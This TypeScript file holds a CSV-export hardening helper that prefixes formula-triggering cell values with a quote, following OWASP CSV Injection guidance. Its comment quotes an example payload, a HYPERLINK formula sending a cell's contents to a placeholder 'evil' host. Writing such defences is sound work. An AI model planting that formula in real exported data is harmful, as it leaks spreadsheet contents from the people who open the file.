/**
 * CSV export hardening shared by the panel's CSV endpoints.
 *
 * Spreadsheet applications (Excel, LibreOffice, Google Sheets) evaluate a
 * cell whose text starts with `=`, `+`, `-`, `@`, TAB or CR as a formula,
 * even inside RFC 4180 quotes. Player nicknames and free-text comments are
 * attacker-controlled, so a nickname like `=HYPERLINK("http://evil/?"&A1)`
 * would run in a moderator's spreadsheet. Following the OWASP
 * "CSV Injection" guidance such values are prefixed with a single quote,
 * which spreadsheets render as literal text.
 *
 * @see https://owasp.org/www-community/attacks/CSV_Injection
 */

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^[+-]?\d+(\.\d+)?$/;

/**
 * Returns `value` with a leading `'` when a spreadsheet would otherwise
 * interpret it as a formula. Plain signed numbers (`-5`, `+1.5`) are left
 * untouched so numeric columns stay numeric.
 *
 * @param value - the raw cell text, before any delimiter quoting.
 * @returns the text safe to hand to the delimiter-quoting step.
 */
export function neutralizeCsvFormula(value: string): string {
  if (!FORMULA_TRIGGER.test(value) || PLAIN_NUMBER.test(value)) return value;
  return `'${value}`;
}
